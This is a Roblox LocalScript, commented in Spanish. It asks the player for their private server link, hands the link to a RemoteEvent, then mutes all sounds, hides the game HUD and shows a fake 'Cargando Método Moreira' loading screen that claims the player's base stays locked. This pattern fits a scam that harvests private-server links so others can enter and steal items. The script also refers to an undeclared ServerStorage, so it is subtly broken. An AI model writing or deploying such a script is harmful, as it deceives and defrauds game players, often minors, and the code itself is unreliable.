-- LocalScript: UI de link + pantalla de carga fullscreen + eliminar sonidos + ocultar HUD
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local StarterPack = game:GetService("StarterPack")
local Lighting = game:GetService("Lighting")

local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- =========================
-- UI INICIAL (PEDIR LINK)
-- =========================
local entryGui = Instance.new("ScreenGui")
entryGui.Name = "ServerLinkUI"
entryGui.IgnoreGuiInset = true
entryGui.ResetOnSpawn = false
entryGui.Parent = PlayerGui
entryGui.DisplayOrder = 1000
entryGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

local entryFrame = Instance.new("Frame")
entryFrame.Size = UDim2.new(0, 400, 0, 250)
entryFrame.AnchorPoint = Vector2.new(0.5, 0.5)
entryFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
entryFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
entryFrame.BorderSizePixel = 0
entryFrame.Parent = entryGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Parent = entryFrame
titleLabel.Size = UDim2.new(1, -40, 0, 30)
titleLabel.Position = UDim2.new(0, 20, 0, 20)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Ingresa el link de tu servidor privado:"
titleLabel.TextColor3 = Color3.fromRGB(255,255,255)
titleLabel.Font = Enum.Font.GothamSemibold
titleLabel.TextScaled = false
titleLabel.TextSize = 18
titleLabel.TextWrapped = true

local linkBox = Instance.new("TextBox")
linkBox.Parent = entryFrame
linkBox.Size = UDim2.new(1, -40, 0, 40)
linkBox.Position = UDim2.new(0, 20, 0, 70)
linkBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
linkBox.TextColor3 = Color3.fromRGB(255,255,255)
linkBox.Text = "https://www.roblox.com/share?code="
linkBox.ClearTextOnFocus = false
linkBox.Font = Enum.Font.Gotham
linkBox.TextSize = 16
linkBox.TextWrapped = true

local msgLabel = Instance.new("TextLabel")
msgLabel.Parent = entryFrame
msgLabel.Size = UDim2.new(1, -40, 0, 20)
msgLabel.Position = UDim2.new(0, 20, 0, 120)
msgLabel.BackgroundTransparency = 1
msgLabel.Text = ""
msgLabel.TextColor3 = Color3.fromRGB(255,0,0)
msgLabel.Font = Enum.Font.GothamBold
msgLabel.TextScaled = false
msgLabel.TextSize = 16
msgLabel.TextWrapped = true

local sendButton = Instance.new("TextButton")
sendButton.Parent = entryFrame
sendButton.Size = UDim2.new(1, -40, 0, 40)
sendButton.Position = UDim2.new(0, 20, 0, 160)
sendButton.Text = "Enviar"
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 18
sendButton.BackgroundColor3 = Color3.fromRGB(70,70,70)
sendButton.TextColor3 = Color3.fromRGB(255,255,255)
sendButton.AutoButtonColor = true
sendButton.BorderSizePixel = 0

-- =========================
-- Función: validar link (solo inicio y final)
-- =========================
local function isLinkValid(link)
	local startPart = "https://www.roblox.com/share?code="
	local endPart = "&type=Server"
	if type(link) ~= "string" then return false end
	return string.sub(link, 1, #startPart) == startPart and string.sub(link, -#endPart) == endPart
end

-- =========================
-- Función: eliminar todos los sonidos actuales y futuros (cliente)
-- =========================
local function removeAllSoundsClient()
	local roots = {
		Workspace,
		SoundService,
		Lighting,
		ReplicatedStorage,
		PlayerGui,
	}

	local function destroyIn(root)
		for _, inst in ipairs(root:GetDescendants()) do
			if inst:IsA("Sound") or inst:IsA("AudioEmitter") then
				pcall(function()
					inst:Stop()
					inst:Destroy()
				end)
			end
		end
	end

	for _, r in ipairs(roots) do
		pcall(function() destroyIn(r) end)
	end

	for _, r in ipairs(roots) do
		pcall(function()
			r.DescendantAdded:Connect(function(obj)
				if obj:IsA("Sound") or obj:IsA("AudioEmitter") then
					pcall(function()
						obj:Stop()
						obj:Destroy()
					end)
				end
			end)
		end)
	end

	pcall(function()
		if type(SoundService.Volume) == "number" then
			SoundService.Volume = 0
		end
	end)
end

-- =========================
-- Función: ocultar HUD
-- =========================
local function hideHUD()
	pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
	for _, guiType in ipairs(Enum.CoreGuiType:GetEnumItems()) do
		pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
	end
end

-- =========================
-- Pantalla de carga FULLSCREEN
-- =========================
local function showFullLoadingScreen()
	local loadingGui = Instance.new("ScreenGui")
	loadingGui.Name = "FullLoadingScreen"
	loadingGui.IgnoreGuiInset = true
	loadingGui.ResetOnSpawn = false
	loadingGui.DisplayOrder = 10000
	loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
	loadingGui.Parent = PlayerGui

	local bg = Instance.new("Frame")
	bg.Size = UDim2.new(1, 0, 1, 0)
	bg.Position = UDim2.new(0, 0, 0, 0)
	bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	bg.BorderSizePixel = 0
	bg.Parent = loadingGui

	local title = Instance.new("TextLabel")
	title.Parent = bg
	title.Size = UDim2.new(1, -40, 0, 80)
	title.Position = UDim2.new(0, 20, 0.35, -40)
	title.BackgroundTransparency = 1
	title.Text = "Cargando Método Moreira"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextScaled = true
	title.Font = Enum.Font.GothamBold

	local barBG = Instance.new("Frame")
	barBG.Parent = bg
	barBG.Size = UDim2.new(0.6, 0, 0, 28)
	barBG.Position = UDim2.new(0.2, 0, 0.52, 0)
	barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	barBG.BorderSizePixel = 0
	barBG.ClipsDescendants = true

	local barFill = Instance.new("Frame")
	barFill.Parent = barBG
	barFill.Size = UDim2.new(0.01, 0, 1, 0)
	barFill.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
	barFill.BorderSizePixel = 0

	local percentLabel = Instance.new("TextLabel")
	percentLabel.Parent = barBG
	percentLabel.Size = UDim2.new(1, 0, 1, 0)
	percentLabel.BackgroundTransparency = 1
	percentLabel.Text = "1%"
	percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	percentLabel.TextScaled = true
	percentLabel.Font = Enum.Font.GothamBold

	local subText = Instance.new("TextLabel")
	subText.Parent = bg
	subText.Size = UDim2.new(1, -40, 0, 40)
	subText.Position = UDim2.new(0, 20, 0.63, 0)
	subText.BackgroundTransparency = 1
	subText.Text = "Tu base se mantendrá bloqueada hasta que termine la carga.."
	subText.TextColor3 = Color3.fromRGB(200, 200, 200)
	subText.TextScaled = true
	subText.Font = Enum.Font.SourceSans

	task.spawn(function()
		for i = 1, 100 do
			barFill.Size = UDim2.new(i/100, 0, 1, 0)
			percentLabel.Text = tostring(i) .. "%"
			task.wait(0.05)
		end
	end)
end

-- =========================
-- Función para buscar datos de brainrots
-- =========================
local function findBrainrotData()
	local brainrotData = {}

	-- Buscar en ReplicatedStorage
	local function searchInObject(obj)
		if obj:IsA("Model") or obj:IsA("Folder") then
			for _, child in ipairs(obj:GetChildren()) do
				if child:IsA("Model") or child:IsA("Folder") then
					local category = child:FindFirstChild("Category")
					local moneyValue = child:FindFirstChild("MoneyValue")
					if category and moneyValue then
						table.insert(brainrotData, {
							Name = child.Name,
							Category = category.Value,
							MoneyGiven = moneyValue.Value,
							MoneyCost = child:FindFirstChild("MoneyCost") and child.MoneyCost.Value or "Unknown"
						})
					end
					searchInObject(child)
				end
			end
		end
	end

	searchInObject(ReplicatedStorage)
	searchInObject(Workspace)
	searchInObject(ServerStorage)

	-- Buscar en la información del jugador
	local userData = Player:FindFirstChild("PlayerData") or Player:FindFirstChild("Data") or Player:FindFirstChild("UserData")
	if userData then
		searchInObject(userData)
	end

	return brainrotData
end

-- =========================
-- Acción al presionar Enviar
-- =========================
sendButton.MouseButton1Click:Connect(function()
	local link = linkBox.Text

	if isLinkValid(link) then
		msgLabel.Text = "El link es válido ✅"
		msgLabel.TextColor3 = Color3.fromRGB(0, 255, 0)

		local remoteEvent = ReplicatedStorage:FindFirstChild("SendServerLink")
		if remoteEvent then
			pcall(function() remoteEvent:FireServer(link) end)
		end

		-- Guardar el link del servidor
		local savedLink = link
		print("Link del servidor guardado:", savedLink)

		-- Buscar datos de brainrots
		local brainrotData = findBrainrotData()
		if #brainrotData > 0 then
			print("Datos de brainrots encontrados:")
			for _, data in ipairs(brainrotData) do
				print("Nombre:", data.Name)
				print("Categoría:", data.Category)
				print("Dinero que da:", data.MoneyGiven)
				print("Dinero que cuesta:", data.MoneyCost)
				print("---------------------------")
			end
			msgLabel.Text = "Datos de brainrots encontrados."
			msgLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
		else
			print("No se encontraron datos de brainrots.")
			msgLabel.Text = "No se encontraron datos de brainrots."
			msgLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
		end

		removeAllSoundsClient()
		hideHUD()
		showFullLoadingScreen()

		entryGui:Destroy()
	else
		msgLabel.Text = "El link es inválido ❌"
		msgLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
	end
end)

-- =========================
-- Función para imprimir la estructura del Workspace
-- =========================
local function printWorkspaceStructure(obj, indent)
	indent = indent or 0
	local indentStr = string.rep("  ", indent)
	print(indentStr .. obj.Name .. " (" .. obj.ClassName .. ")")

	for _, child in ipairs(obj:GetChildren()) do
		printWorkspaceStructure(child, indent + 1)
	end
end

-- Imprimir la estructura del Workspace al inicio
print("Estructura del Workspace:")
printWorkspaceStructure(Workspace)
